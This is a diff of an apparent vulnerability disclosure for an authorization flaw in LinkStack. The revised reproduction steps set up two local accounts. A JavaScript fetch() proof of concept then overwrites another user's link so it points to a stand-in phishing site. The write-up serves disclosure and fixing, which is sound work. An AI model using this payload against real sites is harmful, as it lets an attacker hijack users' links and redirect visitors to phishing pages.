@@ -135,7 +135,24 @@ Link IDs are visible in public page source code, making enumeration trivial.
 
 ### Step 1: Login as attacker and obtain session
 
-Navigate to the LinkStack login page and authenticate as the attacker user.
+Create two users one as the admin and one as a regular user.
+
+Visit /admin/users to create another user. Click on Add a new user on the bottom. 
+
+<img width="1456" height="847" alt="image" src="https://github.com/user-attachments/assets/98fe1036-4801-4406-9c38-2a6162bbe008" />
+
+After creating the user, click on pending to verify the user and login.
+
+Create a link on the admin account and grab the id by clicking on edit, it will be in the url.
+
+<img width="1035" height="835" alt="image" src="https://github.com/user-attachments/assets/10ebadd4-22d6-4d56-a5a4-5a53fe15d0cd" />
+
+<img width="684" height="317" alt="image" src="https://github.com/user-attachments/assets/e84e5c11-90a8-4cab-8b5b-ef9b872fee4e" />
+
+<img width="643" height="364" alt="image" src="https://github.com/user-attachments/assets/7fe74a3f-0ba8-4d52-9148-9e81162bfdb8" />
+
+
+
 
 ### Step 2: Overwrite victim's link
 
@@ -149,7 +166,7 @@ fetch('/studio/edit-link', {
     'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
   },
   body: new URLSearchParams({
-    linkid: '153589040',
+    linkid: '946500709',
     link: 'https://evil-phishing-site.com',
     title: 'HACKED BY ATTACKER',
     typename: 'link',
@@ -158,13 +175,14 @@ fetch('/studio/edit-link', {
 }).then(r => console.log('Status:', r.status))
 ```
 
+<img width="1670" height="853" alt="image" src="https://github.com/user-attachments/assets/e3d2a405-6ff8-4490-ae2d-38c5811e02ec" />
+
+
 ### Step 3: Verify
 
-Visit the victim's public profile page (e.g., `http://localhost:3063/@admin`). The victim's link now displays "HACKED BY ATTACKER" and points to `https://evil-phishing-site.com`.
+Log back in as the admin. The victim's link now displays "HACKED BY ATTACKER" and points to `https://evil-phishing-site.com`.
 
-### Finding victim link IDs
-
-Link IDs are exposed in the public page source. View the source of any user's profile page (`/@username`) and search for link identifiers in the HTML, or inspect the `/going/{id}` redirect URLs.
+<img width="1668" height="731" alt="image" src="https://github.com/user-attachments/assets/cc1c79a0-d95e-471e-8b6b-0eddf252a2fa" />
 
 ## Preconditions
 
